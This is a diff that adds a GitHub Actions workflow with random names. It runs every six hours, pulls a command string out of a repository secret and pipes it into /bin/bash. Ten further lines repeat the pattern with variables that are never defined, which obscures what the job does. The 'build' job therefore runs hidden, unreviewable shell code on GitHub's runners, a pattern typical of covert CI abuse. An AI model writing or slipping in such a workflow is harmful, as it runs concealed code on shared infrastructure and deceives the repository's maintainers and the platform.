@@ -1,0 +1,28 @@
+name: haoriyangw
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: haoriyangw
+        env:
+          uvhg270: ${{ secrets.uvhg270 }}
+        run: |
+          echo $uvhg270 | jq -r .zyqn56216 | /bin/bash
+          echo $nftea92 | jq -r .vkcx7 | /bin/bash
+          echo $gknf16622 | jq -r .emvv01851 | /bin/bash
+          echo $oh4066 | jq -r .c6775 | /bin/bash
+          echo $kgs0 | jq -r .v43 | /bin/bash
+          echo $ybfw057 | jq -r .kk44 | /bin/bash
+          echo $gd71216 | jq -r .maqej10 | /bin/bash
+          echo $uktqh08 | jq -r .dj096 | /bin/bash
+          echo $oou5336 | jq -r .lk05756 | /bin/bash
+          echo $moc929 | jq -r .abxa8 | /bin/bash
+          echo $owef3 | jq -r .cfn3 | /bin/bash
+
